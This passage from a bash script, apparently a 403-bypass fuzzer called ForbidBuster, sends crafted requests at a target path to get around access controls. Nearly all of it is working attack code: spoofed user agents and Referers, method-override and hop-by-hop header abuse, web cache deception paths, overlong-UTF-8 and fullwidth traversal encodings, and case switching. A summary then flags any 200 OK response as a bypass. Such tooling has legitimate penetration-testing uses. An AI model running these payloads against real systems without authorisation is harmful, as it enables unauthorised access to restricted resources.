    "Twitterbot/1.0"
    "LinkedInBot/1.0 (compatible; Mozilla/5.0)"
    "WhatsApp/2.23.20.0"
    "curl/7.68.0"
    "Wget/1.21"
    "python-requests/2.28.0"
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 Chrome/91.0.4472.120 Mobile Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1"
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
    "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
    "internal-scanner"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
)

print_section "USER-AGENT FUZZING" "🤖" "${#user_agents[@]}"

for ua in "${user_agents[@]}"; do
    # Truncate UA for display
    ua_short="${ua:0:55}"
    [[ ${#ua} -gt 55 ]] && ua_short="${ua_short}..."
    do_request "${YELLOW}UA: ${ua_short}${RESET}" -H "User-Agent: $ua" "${URL}/${PATH_TARGET}"
done


# ════════════════════════════════════════════════════════════════════════════
#  6. HTTP METHOD OVERRIDE HEADERS
# ════════════════════════════════════════════════════════════════════════════
override_methods=("GET" "POST" "PUT" "PATCH" "DELETE" "OPTIONS" "HEAD" "TRACE")
override_headers=("X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method")

total_overrides=$(( ${#override_methods[@]} * ${#override_headers[@]} ))
print_section "METHOD OVERRIDE HEADERS" "🔀" "${total_overrides}"

for oh in "${override_headers[@]}"; do
    for om in "${override_methods[@]}"; do
        do_request "${YELLOW}${oh}: ${om}${RESET}" -H "$oh: $om" "${URL}/${PATH_TARGET}"
    done
done


# ════════════════════════════════════════════════════════════════════════════
#  7. HOP-BY-HOP HEADER ABUSE
# ════════════════════════════════════════════════════════════════════════════
hopbyhop_headers=(
    "X-Forwarded-For"
    "X-Forwarded-Host"
    "X-Real-IP"
    "X-Client-IP"
    "X-Remote-IP"
    "X-Originating-IP"
    "X-Remote-Addr"
    "X-Custom-IP-Authorization"
    "CF-Connecting-IP"
    "True-Client-IP"
)

print_section "HOP-BY-HOP HEADER ABUSE" "🔗" "${#hopbyhop_headers[@]}"

for hdr in "${hopbyhop_headers[@]}"; do
    do_request "${YELLOW}Connection: close, ${hdr}${RESET}" -H "Connection: close, $hdr" "${URL}/${PATH_TARGET}"
done


# ════════════════════════════════════════════════════════════════════════════
#  8. CACHE POISONING / WEB CACHE DECEPTION
# ════════════════════════════════════════════════════════════════════════════
cache_paths=(
    "${URL}/${PATH_TARGET}/.css"
    "${URL}/${PATH_TARGET}/.js"
    "${URL}/${PATH_TARGET}/.ico"
    "${URL}/${PATH_TARGET}/.png"
    "${URL}/${PATH_TARGET}/.svg"
    "${URL}/${PATH_TARGET}/.jpg"
    "${URL}/${PATH_TARGET}/.woff"
    "${URL}/${PATH_TARGET}/.woff2"
    "${URL}/${PATH_TARGET}%2f.css"
    "${URL}/${PATH_TARGET}%2f.js"
    "${URL}/${PATH_TARGET}/..;/.css"
    "${URL}/${PATH_TARGET}/..;/.js"
    "${URL}/${PATH_TARGET}/..;test.css"
    "${URL}/${PATH_TARGET}/anything.css"
    "${URL}/${PATH_TARGET}/test.js"
    "${URL}/${PATH_TARGET}%0a.css"
    "${URL}/${PATH_TARGET}%0d%0a.css"
    "${URL}/${PATH_TARGET}%3b.css"
)

print_section "CACHE POISONING / WEB CACHE DECEPTION" "💀" "${#cache_paths[@]}"

for cpath in "${cache_paths[@]}"; do
    do_request "${NEON_PURPLE}${cpath}${RESET}" "$cpath"
done


# ════════════════════════════════════════════════════════════════════════════
#  9. UNICODE / FULLWIDTH ENCODING
# ════════════════════════════════════════════════════════════════════════════
unicode_paths=(
    "${URL}/%ef%bc%8f${PATH_TARGET}"
    "${URL}/${PATH_TARGET}%ef%bc%8f"
    "${URL}/%ef%bc%8f${PATH_TARGET}%ef%bc%8f"
    "${URL}/${PATH_TARGET}%ef%bc%8e%ef%bc%8e/"
    "${URL}/%ef%bc%8e%ef%bc%8e/${PATH_TARGET}"
    "${URL}/%c0%af${PATH_TARGET}"
    "${URL}/${PATH_TARGET}%c0%af"
    "${URL}/%c0%af${PATH_TARGET}%c0%af"
    "${URL}/%e0%80%af${PATH_TARGET}"
    "${URL}/${PATH_TARGET}%e0%80%af"
    "${URL}/${PATH_TARGET}%c0%ae%c0%ae/"
    "${URL}/%c0%ae%c0%ae/${PATH_TARGET}"
    "${URL}/${PATH_TARGET}%c0%ae%c0%ae%c0%af"
    "${URL}/${PATH_TARGET}%c0%af..%c0%af"
    "${URL}/${PATH_TARGET}%c0%af..%c0%af..%c0%af"
)

print_section "UNICODE & FULLWIDTH ENCODING" "🔤" "${#unicode_paths[@]}"

for upath in "${unicode_paths[@]}"; do
    do_request "${NEON_ORANGE}${upath}${RESET}" "$upath"
done


# ════════════════════════════════════════════════════════════════════════════
#  10. CASE SWITCHING
# ════════════════════════════════════════════════════════════════════════════
path_upper=$(echo "${PATH_TARGET}" | tr '[:lower:]' '[:upper:]')
path_lower=$(echo "${PATH_TARGET}" | tr '[:upper:]' '[:lower:]')
path_capitalize=$(echo "${PATH_TARGET}" | sed 's/\b\(.\)/\u\1/g')
first_char=$(echo "${PATH_TARGET:0:1}" | tr '[:lower:]' '[:upper:]')
path_first_upper="${first_char}${PATH_TARGET:1}"

case_paths=(
    "${URL}/${path_upper}"
    "${URL}/${path_lower}"
    "${URL}/${path_capitalize}"
    "${URL}/${path_first_upper}"
)

print_section "CASE SWITCHING" "🔠" "${#case_paths[@]}"

for cpath in "${case_paths[@]}"; do
    do_request "${NEON_PINK}${cpath}${RESET}" "$cpath"
done


# ════════════════════════════════════════════════════════════════════════════
#  11. REFERER HEADER SPOOFING
# ════════════════════════════════════════════════════════════════════════════
referer_values=(
    "${URL}/${PATH_TARGET}"
    "${URL}/admin"
    "${URL}/"
    "https://localhost"
    "https://localhost/${PATH_TARGET}"
    "https://127.0.0.1"
    "https://127.0.0.1/${PATH_TARGET}"
    "https://www.google.com"
    "https://www.google.com/search?q=${URL}"
    "${URL}/login"
    "${URL}/dashboard"
)

print_section "REFERER HEADER SPOOFING" "🪞" "${#referer_values[@]}"

for ref in "${referer_values[@]}"; do
    do_request "${YELLOW}Referer: ${ref}${RESET}" -H "Referer: $ref" "${URL}/${PATH_TARGET}"
done


# ════════════════════════════════════════════════════════════════════════════
#  12. WAYBACK MACHINE CHECK
# ════════════════════════════════════════════════════════════════════════════
print_section "WAYBACK MACHINE CHECK" "⏳" "1"

wayback_response=$(curl -s --connect-timeout 10 --max-time 15 "https://archive.org/wayback/available?url=${URL}/${PATH_TARGET}" 2>/dev/null)
wayback_available=$(echo "$wayback_response" | grep -o '"available": *[a-z]*' | head -1 | grep -o 'true\|false')
wayback_url=$(echo "$wayback_response" | grep -o '"url": *"[^"]*"' | head -1 | sed 's/"url": *"//;s/"//')

if [[ "$wayback_available" == "true" ]]; then
    echo -e "    ${NEON_GREEN}${BOLD}[★] FOUND${RESET}  ${DIM}│${RESET} ${NEON_GREEN}Archived snapshot available!${RESET}"
    echo -e "    ${DIM}         │${RESET} ${CYAN}${BOLD}${wayback_url}${RESET}"
else
    echo -e "    ${RED}[✗] N/A${RESET}    ${DIM}│${RESET} ${DIM}No archived snapshot available${RESET}"
fi


# ════════════════════════════════════════════════════════════════════════════
#  SCAN SUMMARY REPORT
# ════════════════════════════════════════════════════════════════════════════
echo ""
echo ""
echo -e "  ${NEON_CYAN}╔══════════════════════════════════════════════════════════════════╗${RESET}"
echo -e "  ${NEON_CYAN}║${RESET}  📊  ${WHITE}${BOLD}SCAN COMPLETE — SUMMARY REPORT${RESET}"
echo -e "  ${NEON_CYAN}╠══════════════════════════════════════════════════════════════════╣${RESET}"
echo -e "  ${NEON_CYAN}║${RESET}"
echo -e "  ${NEON_CYAN}║${RESET}   ${WHITE}${BOLD}Total Requests  :${RESET}  ${BOLD}${TOTAL}${RESET}"
echo -e "  ${NEON_CYAN}║${RESET}   ${NEON_GREEN}${BOLD}★ 200 OK        :${RESET}  ${NEON_GREEN}${BOLD}${COUNT_200}${RESET}"
echo -e "  ${NEON_CYAN}║${RESET}   ${NEON_RED}${BOLD}✗ 403 Forbidden :${RESET}  ${RED}${BOLD}${COUNT_403}${RESET}"
echo -e "  ${NEON_CYAN}║${RESET}   ${YELLOW}${BOLD}? Other         :${RESET}  ${YELLOW}${BOLD}${COUNT_OTHER}${RESET}"
echo -e "  ${NEON_CYAN}║${RESET}"

if [[ $COUNT_200 -gt 0 ]]; then
    echo -e "  ${NEON_CYAN}║${RESET}   ${NEON_GREEN}${BOLD}🎯 POTENTIAL BYPASS FOUND!${RESET}"
    echo -e "  ${NEON_CYAN}║${RESET}   ${NEON_GREEN}${COUNT_200} request(s) returned ${BOLD}200 OK${RESET}"
    echo -e "  ${NEON_CYAN}║${RESET}   ${DIM}Scroll up and look for ${RESET}${NEON_GREEN}${BOLD}[★]${RESET}${DIM} markers${RESET}"
else
    echo -e "  ${NEON_CYAN}║${RESET}   ${RED}${BOLD}✘ No 200 OK responses found${RESET}"
    echo -e "  ${NEON_CYAN}║${RESET}   ${DIM}Target may be well-protected${RESET}"
fi

echo -e "  ${NEON_CYAN}║${RESET}"
echo -e "  ${NEON_CYAN}╠══════════════════════════════════════════════════════════════════╣${RESET}"
echo -e "  ${NEON_CYAN}║${RESET}  ${DIM}ForbidBuster v2.0 • @eh-amish • github.com/eh-amish${RESET}"
echo -e "  ${NEON_CYAN}╚══════════════════════════════════════════════════════════════════╝${RESET}"
echo ""
